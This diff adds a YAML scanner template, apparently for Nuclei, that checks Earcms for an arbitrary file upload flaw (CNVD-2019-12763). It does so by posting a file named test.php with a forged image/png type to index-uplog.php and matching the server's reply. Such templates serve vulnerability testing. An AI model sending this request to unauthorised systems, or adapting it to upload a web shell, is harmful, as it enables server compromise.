@@ -1,0 +1,39 @@
+id: earcms-upload
+
+info:
+  name: Earcms 应用分发系统 index-uplog.php 存在文件上传漏洞
+  author: Str1am
+  severity: critical
+  reference: https://www.cnvd.org.cn/flaw/show/CNVD-2019-12763
+  tags: Earcms,upload
+
+requests:
+  - raw:
+      - |
+        POST /earcms/source/pack/upload/index-uplog.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------4219849002870802959186602799
+
+        -----------------------------4219849002870802959186602799
+        Content-Disposition: form-data; name="app"; filename="test.php"
+        Content-Type: image/png
+        
+        123
+        -----------------------------4219849002870802959186602799
+        Content-Disposition: form-data; name="time"
+        
+        1-1
+        -----------------------------4219849002870802959186602799--
+   
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{'extension':'php','time':'1-1'}"
+        part: body
+        condition: and
